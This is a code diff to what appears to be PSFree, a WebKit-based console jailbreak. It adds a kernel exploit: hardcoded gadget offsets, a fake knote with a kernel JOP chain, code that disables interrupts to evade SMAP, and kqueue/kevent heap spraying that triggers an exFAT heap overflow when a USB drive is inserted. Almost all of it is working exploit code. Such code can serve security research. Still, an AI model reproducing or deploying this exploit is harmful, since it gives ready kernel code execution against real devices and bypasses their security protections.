@@ -1,4 +1,4 @@
-/* Copyright (C) 2023 anonymous
+/* Copyright (C) 2023-2024 anonymous
 
 This file is part of PSFree.
 
@@ -73,7 +73,11 @@ let libkernel_base = null;
 let libc_base = null;
 
 // gadgets for the JOP chain
-//
+const kjop1 = `
+mov rdi, qword ptr [rdi]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0xe0]
+`;
 // Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
 // because jop1-5 was the original chain used by the old implementation of
 // Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
@@ -172,11 +176,21 @@ const webkit_gadget_offsets = new Map(Object.entries({
     'push rsp; jmp qword ptr [rax]' : 0x0000000001abbc92,
     'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000000b8bc06,
     'pop rdi; jmp qword ptr [rax + 0x50]' : 0x00000000021f9e8e,
+    'add rax, 8; ret': 0x0000000000468988,
 
     'mov qword ptr [rdi], rsi; ret' : 0x0000000000034a40,
     'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
     'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
+    'mov dword ptr [rdi], eax; ret' : 0x000000000001f864,
     'mov rdx, rcx; ret' : 0x0000000000eae9fd,
+    'mov qword ptr [rdx], rax; mov al, 1; ret' : 0x00000000000b6dcf,
+    'mov rdx, qword ptr [rcx]; ret' : 0x0000000000182bc4,
+
+    'cli; ret' : 0x00000000004b95fc,
+    'sti; ret' : 0x00000000004b94c8,
+    'xchg rbp, rax; ret' : 0x000000000218ef60,
+
+    [kjop1] : 0x00000000010da705,
 
     [jop1] : 0x000000000028a8d0,
     [jop2] : 0x000000000076b970,
@@ -538,6 +552,7 @@ class Chain803 extends Chain803Base {
         this.webcore_ta.write64(0, this.old_vtable_p);
     }
 }
+const Chain = Chain803;
 
 function init(Chain) {
     [libwebkit_base, libkernel_base, libc_base] = get_bases();
@@ -550,7 +565,7 @@ function init(Chain) {
     Chain.init_class(gadgets, syscall_array);
 }
 
-function rop(Chain) {
+function test_rop(Chain) {
     const jmp_buf = new Uint8Array(jmp_buf_size);
     const jmp_buf_p = get_view_vector(jmp_buf);
 
@@ -665,5 +680,196 @@ function rop(Chain) {
     }
 }
 
-debug_log('Chain803');
-rop(Chain803);
+function mlock_gadgets(gadgets) {
+    const chain = new Chain();
+
+    for (const [gadget, addr] of gadgets) {
+        // amd64 instructions can be up to 15 bytes in length
+        chain.push_syscall('mlock', addr, 0x10);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+}
+
+function mlock_kchain(kchain) {
+    const chain = new Chain();
+    const stack_buffer = kchain.stack_buffer;
+    const stack_buffer_p = get_view_vector(new Uint8Array(stack_buffer));
+    // have a view point to the buffer of stack_buffer
+    chain.syscall('mlock', stack_buffer_p, stack_buffer.byteLength);
+    chain.syscall('mlock', kchain.retval_addr, kchain._return_value.length);
+    chain.syscall('mlock', kchain.jmp_buf_p, kchain.jmp_buf.length);
+}
+
+function prepare_knote(kchain) {
+    const chain = new Chain();
+    const size = 0x4000 * 4;
+
+    chain.syscall('mmap', 0x4000, size, 3, 0x1010, 0xffffffff, 0);
+    const knote = new Addr(chain.return_value);
+
+    debug_log(`knote addr: ${knote}`);
+    if ((knote.low() !== 0x4000) && (knote.high() !== 0)) {
+        die('mmap failed');
+    }
+
+    const filterops = knote.add(0x4000);
+    const jop_buffer = knote.add(0x8000);
+    const rax_ptrs = knote.add(0xc000);
+
+    const offset_kn_fop = 0x68;
+    knote.write64(0, jop_buffer);
+    knote.write64(offset_kn_fop, filterops);
+
+    const offset_f_detach = 0x10;
+    filterops.write64(offset_f_detach, kchain.get_gadget(kjop1));
+
+    jop_buffer.write64(0, rax_ptrs);
+
+    // for the kernel JOP chain
+    rax_ptrs.write64(0xe0, kchain.get_gadget(jop2));
+    rax_ptrs.write64(0x30, kchain.get_gadget(jop3));
+    rax_ptrs.write64(0x10, kchain.get_gadget(jop4));
+    rax_ptrs.write64(0, kchain.get_gadget(jop5));
+    // value to pivot rsp to
+    rax_ptrs.write64(0x18, kchain.stack_addr);
+
+    // offset relative to the return address
+    // kqueue_close() epilogue
+    //const offset_kqueue_close_epi = 436;
+    const offset_kqueue_close_epi = 689;
+
+    kchain.push_save();
+
+    // prevent the ghetto SMAP from catching us
+    kchain.push_gadget('cli; ret');
+
+    // get kernel stack pointer
+    kchain.push_gadget('xchg rbp, rax; ret');
+    // ret_addr = *(rbp + 8)
+    kchain.push_gadget('add rax, 8; ret');
+    kchain.push_get_retval();
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+    // ret_addr += offset_kqueue_close_epi
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(offset_kqueue_close_epi);
+    kchain.push_gadget('add rax, rdx; ret');
+    // modify return address to jump to the epilogue
+    // *(rbp + 8) = ret_addr
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.retval_addr);
+    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+
+    kchain.push_gadget('pop rdi; ret');
+    kchain.push_constant(0x4000);
+    kchain.push_gadget('pop rsi; ret');
+    kchain.push_constant("0xdeadbeefbeefdead");
+    kchain.push_gadget('mov qword ptr [rdi], rsi; ret');
+
+    kchain.push_restore();
+    // Small chance the ghetto SMAP catches us lacking since we haven't pivoted
+    // rsp back to a kernel address.
+    kchain.push_gadget('sti; ret');
+    kchain.push_end();
+
+    chain.syscall('mlock', knote, size);
+}
+
+// malloc/free until the heap is shaped in a certain way, such that the exFAT
+// heap oveflow bug overwrites a knote
+function trigger_oob(kchain) {
+    const chain = new Chain();
+
+    const num_kqueue = 0x1b0;
+    const kqueues = new Uint32Array(num_kqueue);
+    const kqueues_p = get_view_vector(kqueues);
+
+    for (let i = 0; i < num_kqueue; i++) {
+        chain.push_syscall('kqueue');
+        chain.push_gadget('pop rdi; ret');
+        chain.push_value(kqueues_p.add(i * 4));
+        chain.push_gadget('mov dword ptr [rdi], eax; ret');
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    const AF_INET = 2;
+    const SOCK_STREAM = 1;
+    // socket file descriptor
+    chain.syscall('socket', AF_INET, SOCK_STREAM, 0);
+    const sd = chain.return_value;
+    // pOOBs4 wasn't checking the upper 32 bits of the Int but they probably
+    // meant to. They probably want 0x100 <= sd < 0x200 and not allow something
+    // like sd == 0x1_0000_0100.
+    //
+    // We suspect why they want a specific file descriptor is because
+    // kqueue_expand() allocates memory whose size depends on the file
+    // descriptor number.
+    //
+    // The specific malloc size is probably a part in their method in shaping
+    // the heap.
+    if (sd.low() < 0x100 || sd.low() >= 0x200 || sd.high() !== 0) {
+        die(`invalid socket: ${sd}`);
+    }
+    debug_log(`socket descriptor: ${sd}`);
+
+    // spray kevents
+    const kevent = new Uint8Array(0x20);
+    const kevent_p = get_view_vector(kevent);
+    kevent_p.write64(0, sd);
+    // EV_ADD and EVFILT_READ
+    kevent_p.write32(0x8, 0x1ffff);
+    kevent_p.write32(0xc, 0);
+    kevent_p.write64(0x10, Int.Zero);
+    kevent_p.write64(0x18, Int.Zero);
+
+    for (let i = 0; i < num_kqueue; i++) {
+        // nchanges == 1, everything else is NULL/0
+        chain.push_syscall('kevent', kqueues[i], kevent_p, 1, 0, 0, 0);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    // fragment memory
+    for (let i = 18; i < num_kqueue; i += 2) {
+        chain.push_syscall('close', kqueues[i]);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    // trigger OOB
+    alert('insert USB');
+
+    // trigger corrupt knote
+    for (let i = 1; i < num_kqueue; i += 2) {
+        chain.push_syscall('close', kqueues[i]);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+}
+
+function kexploit() {
+    init(Chain);
+    const kchain = new Chain();
+
+    mlock_gadgets(gadgets);
+    mlock_kchain(kchain);
+    prepare_knote(kchain);
+    trigger_oob(kchain);
+
+    const kretval = kchain.return_value;
+    debug_log(`kchain retval: ${kretval}`);
+    debug_log(kchain.jmp_buf);
+    debug_log(new Addr(0x4000).read64(0));
+    if (kretval.low() === 0 && kretval.high() === 0) {
+        die('heap overflow failed');
+    }
+}
+
+kexploit();
